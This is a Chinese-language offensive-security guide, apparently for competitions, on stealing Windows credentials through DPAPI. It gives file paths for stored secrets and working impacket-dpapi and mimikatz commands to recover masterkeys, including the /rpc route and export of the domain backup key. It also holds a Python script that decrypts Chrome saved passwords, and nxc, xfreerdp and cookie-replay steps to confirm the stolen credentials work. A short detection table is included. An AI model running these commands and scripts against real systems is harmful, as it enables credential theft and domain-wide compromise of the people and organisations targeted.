# DPAPI 解密链：三种作用域、masterkey 定位、明文验伤

> 被 `competition-dpapi-credential-chain` 引用。DPAPI 的核心难点不是「解密算法」，
> 而是**这块密文属于哪个作用域、由哪个 masterkey 保护、那个 masterkey 我能不能拿到**。
>
> 三步走错一步就全错：**blob → masterkey → 解密上下文**。三者必须同 scope（用户 SID 或机器）。

## 一、作用域三分（判错就解不开）

| 作用域 | 谁保护 masterkey | masterkey 在哪 | 什么时候需要域备份密钥 |
| --- | --- | --- | --- |
| **用户 DPAPI** | 由 **SHA1(UTF-16LE(密码))** 派生密钥包裹（masterkey 本身经 PBKDF2-SHA1 迭代 4000 次派生） | `%APPDATA%\Microsoft\Protect\<用户SID>\<GUID>` | 密码未知、且没有该用户登录上下文时 |
| **机器 DPAPI** | 由**机器账号密码**（`$MACHINE.ACC`）派生的密钥包裹 | `C:\Windows\System32\Microsoft\Protect\S-1-5-18\` | 机器账号密码未知时 |
| **域备份密钥（DPAPI Backup Key）** | 域内 `BABE` 公/私钥对（公钥存于域，私钥存于 DC） | DC 的 `BCKUPKEY` 系列对象 | — 它本身就是「万能钥匙」，能解前两者 |

**关键判据**：`Protect\` 下的**子目录名（SID）**决定了 masterkey 用谁的密钥包裹。
- 子目录是用户 SID → 用户 scope（`S-1-5-21-...-1001`）；
- 子目录是 `S-1-5-18` → 机器 scope；
- **域备份密钥能同时解用户与机器两种 scope**——这是离线分析的主路，也是它危害最大的原因。

## 二、先定位 blob：凭据到底存在哪

| 目标 | 路径 | 格式 |
| --- | --- | --- |
| Credential Manager | `%APPDATA%\Microsoft\Credentials\<GUID>`、`%LOCALAPPDATA%\Microsoft\Credentials\<GUID>` | DPAPI blob（`CREDENTIAL` 结构外壳） |
| Credential Manager（系统级） | `C:\Windows\System32\config\systemprofile\AppData\...\Credentials\` | 同上 |
| Vault | `%LOCALAPPDATA%\Microsoft\Vault\<GUID>\Policy.vpol` | 内含多个 DPAPI blob |
| Chrome/Edge 密码 | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`（SQLite） | 字段 `password_value` 前缀 `v10` + AES-GCM 密文（v80+）；`v20` 起为 App-Bound Encryption |
| Chrome/Edge Cookie | 同目录 `Network\Cookies`（SQLite） | `encrypted_value`，v20 起用 App-Bound Encryption |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\<p>\logins.json` + `key4.db` | 不是 DPAPI，是 NSS（别混） |
| Wi-Fi | `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<GUID>\<SSID>.xml` | `keyMaterial` = DPAPI blob |
| RDP 保存的凭据 | `%LOCALAPPDATA%\Microsoft\Credentials\` + `Terminal Server Client\Servers` | DPAPI blob |
| 计划任务凭据 | `C:\Windows\System32\Tasks\*`（XML 里 `<Password>`） | DPAPI blob（机器 scope） |
| IIS / 应用池 | `%SystemRoot%\System32\inetsrv\config\applicationHost.config` | `encryptedData`（`iisCngConfigurationKey` 或 DPAPI） |
| 服务账号 | `HKLM\SECURITY\Policy\Secrets\` | **LSA Secret，不是 DPAPI**（别混，见 `identity-windows.md`） |

**采集命令**（离线分析时把文件拷走即可）：

```bash
# 用户侧
cp -r "/mnt/c/Users/alice/AppData/Roaming/Microsoft/Protect" ./protect_user/
cp -r "/mnt/c/Users/alice/AppData/Roaming/Microsoft/Credentials" ./creds_user/
cp "/mnt/c/Users/alice/AppData/Local/Google/Chrome/User Data/Default/Login Data" ./login.db

# 机器侧（需管理员）
cp -r "/mnt/c/Windows/System32/Microsoft/Protect/S-1-5-18" ./protect_machine/
```

## 三、masterkey 的来源：四条路，按可得性排序

### 路 1：有用户明文密码（最直接）

```bash
# 用密码 + 用户 SID 解 masterkey，再解 blob（一次全解，含 Chrome/Wi-Fi/Vault）
impacket-dpapi masterkey -file ./protect_user/<GUID> \
  -sid S-1-5-21-1111111111-2222222222-3333333333-1001 \
  -password 'UserPassw0rd!'

# 得到 masterkey 后解具体 blob（-key 后面是 64 字节 hex，即上一步打印的 MasterKey）
impacket-dpapi credential -file ./creds_user/<GUID> -key 0x<MASTERKEY_HEX>
```

`impacket-dpapi masterkey` 成功时输出形如：

```
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 5f2b...-...
Flags       :        0 (0)
MasterKey   : 7a3c...（64 字节 hex）
```

**注意**：传给 `credential -key` 的是 **masterkey 本身**（64 字节），不是它的 SHA1。
部分老文档写「用 SHA1」是因为早期工具接口不同，照着写会报 `Wrong Master key`。

### 路 2：没有明文密码时（**NT 哈希解不了用户 DPAPI**，这一点常被搞错）

用户 masterkey 的派生输入是 **SHA1(UTF-16LE(密码))**（即 `DPAPI_SHA1`），再经 PBKDF2 迭代 4000 次。
**NT 哈希是 MD4(密码)，与它无关，不能拿来解 masterkey。** 这是 DPAPI 与 LSASS PtH 最大的差别。

没有明文时只有三条路：

```bash
# 路 2a：有 SHA1(密码)（mimikatz 里叫 sha1 / DPAPI_SHA1，可从 sekurlsa 的某些字段拿到）
impacket-dpapi masterkey -file ./protect_user/<GUID> -sid S-1-5-21-...-1001 \
  -password '<SHA1_HEX>'    # impacket 只吃明文；SHA1 场景请用 mimikatz 的 /hash
mimikatz "dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1001\<GUID> /hash:<SHA1_HEX>" "exit"

# 路 2b：在该用户的登录上下文里直接解（最省事，不需要密码）
#   已在该用户会话中执行 mimikatz，让它用当前令牌里的 DPAPI 密钥
mimikatz "dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1001\<GUID>" "exit"
# 或对该用户的所有 blob 一把解
mimikatz "dpapi::cred /in:C:\Users\alice\AppData\Roaming\Microsoft\Credentials\<GUID>" "exit"

# 路 2c：让 DC 用域备份密钥代解（不需要用户密码，但需要能调 MS-BKRP）
mimikatz "dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1001\<GUID> /rpc" "exit"
```

`/rpc` 是**关键参数**：它向 DC 请求「用域备份密钥解这个 masterkey」。
前提：能通过网络访问 DC 的 `MS-BKRP` 接口，且当前身份被允许（域管、或该机器管理员 + DC 可达）。
**它会在 DC 留下明确调用记录**（见第六节）。

**判据**：`/rpc` 返回 `Master Key : <64 字节>` = 成功；
报 `ERROR kuhl_m_dpapi_masterkey ; RPC exception` = 网络/权限问题，不是密码问题。

### 路 3：机器 scope（`S-1-5-18`）

```bash
# 有机器账号哈希（如 DC01$ 的 NT 哈希）
impacket-dpapi masterkey -file ./protect_machine/<GUID> \
  -sid S-1-5-18 -machine -password '<MACHINE_NTHASH>'

# 没有机器哈希但有域备份密钥（离线万能路，见路 4）
```

### 路 4：域备份密钥（离线万能，最值得记）

域备份密钥的私钥由 DC 用 `BCKUPKEY_PREFERRED` 保护，能通过 DCSync/DPAPI 接口导出：

```bash
# 用域管从 DC 导出备份密钥（PVK 格式），-export 必须给，否则只打印不落文件
impacket-dpapi backupkeys -dc-ip 10.0.0.10 -target-ip 10.0.0.10 -export \
  'CORP.LOCAL/administrator:Passw0rd!'
# 默认在当前目录生成 BKUPKEY_<GUID>.pvk

# 或 mimikatz（在 DC 上执行）
mimikatz "lsadump::backupkeys /system:dc01.corp.local /export" "exit"
```

导出得到 `BKUPKEY_<GUID>.pvk`。

```bash
# 用备份密钥离线解任意 masterkey（不看用户密码）
impacket-dpapi masterkey -file ./protect_machine/<GUID> \
  -sid S-1-5-18 -pvk BKUPKEY_<GUID>.pvk
```

**这一条是整个 DPAPI 链的终点**：拿到域备份密钥 = 能解域内**任何**用户/机器的 DPAPI，
包括已离职用户的旧数据、其他机器的机器 scope 凭据。报告里要单独标出它的影响面。

## 四、解 blob 的三种形态

### 形态 A：纯 DPAPI blob（Credential / Vault / Wi-Fi）

```bash
impacket-dpapi credential -file ./creds_user/<GUID> -key 0x<MASTERKEY>

# Wi-Fi
impacket-dpapi unprotect -file ./wifi_profile.xml -key 0x<MASTERKEY>
```

### 形态 B：带前缀的浏览器 blob（Chrome v80+）

`password_value` 的内容是 `v10` + 12 字节 nonce + 密文 + 16 字节 tag（AES-256-GCM），
**不是直接 DPAPI blob**，要用 DPAPI 解出「32 字节的 AES key」，再用 AES-GCM 解。

```bash
# 1) 从 Local State 里取 encrypted_key（它本身是 DPAPI blob，前 5 字节是 'DPAPI'）
python3 -c "
import json,base64
d=json.load(open('/mnt/c/Users/alice/AppData/Local/Google/Chrome/User Data/Local State'))
raw=base64.b64decode(d['os_crypt']['encrypted_key'])
assert raw[:5]==b'DPAPI', raw[:5]
open('enc_key.bin','wb').write(raw[5:])"

# 2) 解出 32 字节 AES key
impacket-dpapi unprotect -file ./enc_key.bin -key 0x<MASTERKEY> -raw
# 输出可能直接是二进制，也可能是 hex 文本——先看一次，再决定要不要 xxd -r -p 转回二进制
# 无论哪种，长度必须是 32 字节（AES-256）；只有 16 字节说明拿错了 blob

# 3) 遍历 Login Data，只处理 v10（v20 见下）
python3 - <<'EOF'
import sqlite3
from Crypto.Cipher import AES
key = open('aes_key.bin','rb').read()
assert len(key) == 32, len(key)          # 长度不对就是密钥来源错了
con = sqlite3.connect('login.db')
for origin,user,pw in con.execute("select origin_url,username_value,password_value from logins"):
    if pw[:3] != b'v10':
        print(origin, user, '<not v10, skip>', pw[:3])
        continue
    nonce, ct = pw[3:15], pw[15:]
    pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct[:-16], ct[-16:])
    print(origin, user, pt.decode(errors='replace'))
EOF
```

**`v10` 与 `v20` 不是同一套密钥**：
- `v10` = DPAPI 保护的 AES-256-GCM key（上面的脚本适用）；
- `v20` = **App-Bound Encryption**（2024 年后），密钥由 `Google Chrome Elevation Service`（COM）保护，
  **DPAPI 解不出来**；需要走 COM 接口或注入浏览器进程才有机会。
  判据：`password_value` 前缀是 `v20` → 常规 DPAPI 链**直接不适用**，别硬试、也别把它写成「解密失败」。

### 形态 C：Vault（`Policy.vpol` 里嵌多个 blob）

```bash
# 先解 .vpol 里的每个 attribute blob，再逐条解
impacket-dpapi vault -vpol ./Policy.vpol -masterkey ./masterkey.txt
```

## 五、验伤：怎么证明「解出来的明文能用」

这是本类题目最容易作假的一步。分三层验：

| 层 | 证据 | 假阳性 |
| --- | --- | --- |
| L1 解出明文 | 字符串看起来像密码 | 解出 `garbage` 或空串——通常是**用错了 masterkey**（同 SID 下有多个 GUID，逐个试） |
| L2 明文被服务接受 | `nxc smb 10.0.0.30 -u alice -p '明文' -d corp.local` → `[+]` | 只在本机能登，网络登录失败 → 该账号无 `SeNetworkLogonRight` |
| L3 拿到能力 | `nxc ... --shares` 能列 / `--sam` 能读 / RDP 能进 | **认证成功但权限为空**（账号只有 `Domain Guests`）→ 别写成「拿到主机控制权」 |

**具体验伤命令**：

```bash
# SMB
nxc smb 10.0.0.30 -u alice -p 'RecoveredP@ss' -d corp.local

# WinRM
nxc winrm 10.0.0.30 -u alice -p 'RecoveredP@ss' -d corp.local

# RDP（需 xfreerdp）
xfreerdp /v:10.0.0.30 /u:alice /d:corp.local /p:'RecoveredP@ss' /cert-ignore +auth-only

# Wi-Fi 密码：解出 PSK 后连一次（或至少证明与 AP 的 4 次握手能算通）
```

**浏览器 cookie 的验伤**：把 cookie 导成 Netscape 格式，用 `curl -b cookies.txt` 请求一个需要登录的页面，
看到**返回的是已登录页面**（不是 302 到登录页）才算。仅「解出 cookie 值」不算。

## 六、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| 读 `Protect\` 目录 | 主机 4663 / Sysmon 11（文件读取） | 非常规进程批量读 `Microsoft\Protect` |
| 读浏览器 `Login Data` | 主机 4663 / Sysmon 11 | 进程读 `Login Data` 且进程不是浏览器本体 |
| 调 `MS-BKRP`（备份密钥 RPC） | DC 的 `MS-BKRP` 审计 / 4662 | 非 DC 机器向 DC 请求 `BABE` 相关操作 |
| 导出备份密钥 | DC 4662 + 4624 | 对 `CN=Master Key`/`BCKUPKEY` 的读操作 |
| `dpapi::masterkey /rpc` | DC 4662 | 客户端调用备份密钥接口解 masterkey（**这是最明确的信号**） |
| mimikatz 落地 | Sysmon 1 / 4688 | 命令行含 `dpapi::` / `sekurlsa::` |

**响度**：`/rpc` 路线会在 DC 留一条明确记录，属**中等噪声**；纯离线用 PVK 解则**完全无痕**
（这也是为什么域备份密钥是最值得优先拿的东西）。

## 七、常见坑

1. **SID 与 masterkey 不匹配**。用户 scope 的 blob 用 `S-1-5-18` 的 masterkey 解 = 必失败。
   先看 blob 前缀里的 GUID，再去对应 `Protect\<SID>\` 找同名 GUID 文件。
2. **同一 SID 下有多个 masterkey**。Windows 会轮换，`Preferred` 文件指向当前那个；
   解不开时**逐个 GUID 试**（`impacket-dpapi masterkey` 对每个文件都能跑一次）。
3. **把 `v10/v20` 前缀当 DPAPI blob 直接喂给 `impacket-dpapi`**。会报 `CryptUnprotectData failed`。
   浏览器要按第四节的形态 B 走两步。
4. **机器 scope 用了用户密码**。`-machine` 参数不能忘；机器 scope 的密钥派生用**机器账号密码**，
   用户密码解不开。同理，机器 scope 也不能用「用户哈希」解。
5. **以为有 NT 哈希就能解用户 DPAPI**。用户 masterkey 吃的是 `SHA1(密码)`，不是 MD4。见第三节路 2。
6. **`Policy.vpol` 当单个 blob 解**。它是容器，里面每个 attribute 是独立 blob，要 `impacket-dpapi vault`。
7. **忘了 `Preferred` 文件**。`Protect\<SID>\Preferred` 里存的是当前 masterkey 的 GUID，
   直接读它比逐个试快得多。
8. **验伤只到 L1**。报告写「解出密码 `Xxx123`」但没有一次成功登录，等于没有结论。
9. **把 v20 当「解密失败」**。v20 是另一套密钥体系（COM 保护），不是 DPAPI 能解的，
   要在报告里单列为「不适用」而不是「未成功」。